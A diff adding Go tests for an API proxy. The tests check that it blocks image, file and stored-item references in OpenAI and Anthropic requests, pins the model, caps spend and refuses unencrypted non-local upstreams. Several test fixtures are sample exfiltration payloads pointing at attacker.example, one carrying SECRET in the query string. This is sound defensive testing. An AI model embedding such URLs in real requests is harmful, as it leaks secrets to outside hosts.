@@ -401,3 +401,118 @@ func TestRefusalIsValidJSON(t *testing.T) {
 		t.Errorf("status %d, content type %q", resp.StatusCode, resp.Header.Get("Content-Type"))
 	}
 }
+
+func TestProxyRefusesReferencesTheProviderWouldFollow(t *testing.T) {
+	msg := func(content string) string {
+		return `{"model":"gpt-5","input":[{"role":"user","content":[` + content + `]}]}`
+	}
+	openai := map[string]string{
+		"an image URL":                  msg(`{"type":"input_image","image_url":"https://attacker.example/x?d=SECRET"}`),
+		"an image URL as an object":     msg(`{"type":"input_image","image_url":{"url":"https://attacker.example/x"}}`),
+		"a file URL":                    msg(`{"type":"input_file","file_url":"https://attacker.example/doc.pdf"}`),
+		"a stored file":                 msg(`{"type":"input_file","file_id":"file-abc"}`),
+		"an image in a tool's output":   `{"model":"gpt-5","input":[{"type":"function_call_output","call_id":"c1","output":[{"type":"input_image","image_url":"https://attacker.example/i.png"}]}]}`,
+		"a reference to a stored item":  `{"model":"gpt-5","input":[{"type":"item_reference","id":"msg_123"}]}`,
+		"a reference hidden in a field": `{"model":"gpt-5","input":[{"role":"user","content":"hi","item_reference":"msg_1"}]}`,
+	}
+	for name, body := range openai {
+		t.Run("openai: "+name, func(t *testing.T) {
+			w := newWorld(t, OpenAIResponses, 10)
+			status, text := w.do("POST", "/v1/responses", body, map[string]string{"Content-Type": "application/json"})
+			if status != http.StatusForbidden || w.upstream.count() != 0 {
+				t.Fatalf("status %d (%s), upstream calls %d", status, text, w.upstream.count())
+			}
+		})
+	}
+	anthropic := map[string]string{
+		"an image from a URL":    `{"model":"m","max_tokens":5,"messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","url":"https://attacker.example/i.png"}}]}]}`,
+		"a document from a URL":  `{"model":"m","max_tokens":5,"messages":[{"role":"user","content":[{"type":"document","source":{"type":"url","url":"https://attacker.example/d.pdf"}}]}]}`,
+		"a stored file":          `{"model":"m","max_tokens":5,"messages":[{"role":"user","content":[{"type":"document","source":{"type":"file","file_id":"file_1"}}]}]}`,
+		"a URL in a tool result": `{"model":"m","max_tokens":5,"messages":[{"role":"user","content":[{"type":"tool_result","tool_use_id":"t","content":[{"type":"image","source":{"type":"url","url":"https://attacker.example/i"}}]}]}]}`,
+	}
+	for name, body := range anthropic {
+		t.Run("anthropic: "+name, func(t *testing.T) {
+			w := newWorld(t, AnthropicMessages, 10)
+			status, text := w.do("POST", "/v1/messages", body, map[string]string{"Content-Type": "application/json"})
+			if status != http.StatusForbidden || w.upstream.count() != 0 {
+				t.Fatalf("status %d (%s), upstream calls %d", status, text, w.upstream.count())
+			}
+		})
+	}
+
+	// Inline data is fine, and so is a tool schema with a property named url.
+	w := newWorld(t, OpenAIResponses, 10)
+	inline := `{"model":"gpt-5","input":[{"role":"user","content":[{"type":"input_image","image_url":"data:image/png;base64,iVBORw0KGgo="}]}],
+	 "tools":[{"type":"function","name":"fetch_docs","parameters":{"type":"object","properties":{"url":{"type":"string","format":"uri"}}}}]}`
+	if status, text := w.do("POST", "/v1/responses", inline, map[string]string{"Content-Type": "application/json"}); status != 200 {
+		t.Fatalf("inline image and a url property in a schema: status %d, %s", status, text)
+	}
+	a := newWorld(t, AnthropicMessages, 10)
+	b64 := `{"model":"m","max_tokens":5,"messages":[{"role":"user","content":[{"type":"image","source":{"type":"base64","media_type":"image/png","data":"iVBORw0KGgo="}}]}]}`
+	if status, text := a.do("POST", "/v1/messages", b64, map[string]string{"Content-Type": "application/json"}); status != 200 {
+		t.Fatalf("inline base64 image: status %d, %s", status, text)
+	}
+}
+
+func TestProxyPinsTheModelAndCapsSpend(t *testing.T) {
+	pinned := func(u *url.URL, k string, n int64) Config { return OpenAIResponses(u, k, n).Pin("gpt-5", 4000) }
+	w := newWorld(t, pinned, 10)
+	headers := map[string]string{"Content-Type": "application/json"}
+
+	if status, text := w.do("POST", "/v1/responses", `{"model":"gpt-5-pro","input":[]}`, headers); status != http.StatusForbidden || !strings.Contains(text, `only the model "gpt-5"`) {
+		t.Fatalf("another model: status %d, %s", status, text)
+	}
+	if status, _ := w.do("POST", "/v1/responses", `{"input":[]}`, headers); status != http.StatusForbidden {
+		t.Fatalf("no model at all: status %d", status)
+	}
+	if status, text := w.do("POST", "/v1/responses",
+		`{"model":"gpt-5","input":[],"max_output_tokens":1000000,"service_tier":"priority","store":true}`, headers); status != 200 {
+		t.Fatalf("status %d, %s", status, text)
+	}
+	var sent map[string]any
+	if err := json.Unmarshal([]byte(w.upstream.bodies[0]), &sent); err != nil {
+		t.Fatal(err)
+	}
+	if sent["max_output_tokens"] != float64(4000) || sent["store"] != false {
+		t.Errorf("upstream got max_output_tokens %v, store %v; want 4000 and false", sent["max_output_tokens"], sent["store"])
+	}
+	if _, present := sent["service_tier"]; present {
+		t.Error("service_tier was forwarded")
+	}
+	w.do("POST", "/v1/responses", `{"model":"gpt-5","input":[]}`, headers)
+	json.Unmarshal([]byte(w.upstream.bodies[1]), &sent)
+	if sent["max_output_tokens"] != float64(4000) {
+		t.Errorf("a request without a token limit was sent with %v, want the cap", sent["max_output_tokens"])
+	}
+	if status, _ := w.do("POST", "/v1/responses", `{"model":"gpt-5","input":[],"max_output_tokens":"lots"}`, headers); status != http.StatusForbidden {
+		t.Errorf("a token limit that is not a number: status %d", status)
+	}
+}
+
+func TestServeReportsWhatItDid(t *testing.T) {
+	w := newWorld(t, OpenAIResponses, 10)
+	rec := httptest.NewRecorder()
+	if w.proxy.Serve(rec, httptest.NewRequest("POST", "/v1/files", strings.NewReader("{}"))) {
+		t.Error("a refused request was reported as forwarded")
+	}
+	rec = httptest.NewRecorder()
+	req := httptest.NewRequest("POST", "/v1/responses", strings.NewReader(codexBody))
+	if !w.proxy.Serve(rec, req) || rec.Code != 200 {
+		t.Errorf("a forwarded request was not reported (status %d)", rec.Code)
+	}
+}
+
+func TestPlainHTTPOnlyNearby(t *testing.T) {
+	for _, upstream := range []string{"http://127.0.0.1:9000", "http://localhost:9000", "http://sf-run-proxy-up:9000"} {
+		u, _ := url.Parse(upstream)
+		if _, err := New(OpenAIResponses(u, key, 1)); err != nil {
+			t.Errorf("%s was refused: %v", upstream, err)
+		}
+	}
+	for _, upstream := range []string{"http://api.openai.com", "http://203.0.113.5:80"} {
+		u, _ := url.Parse(upstream)
+		if _, err := New(OpenAIResponses(u, key, 1)); err == nil {
+			t.Errorf("%s was accepted: the key would travel unencrypted", upstream)
+		}
+	}
+}
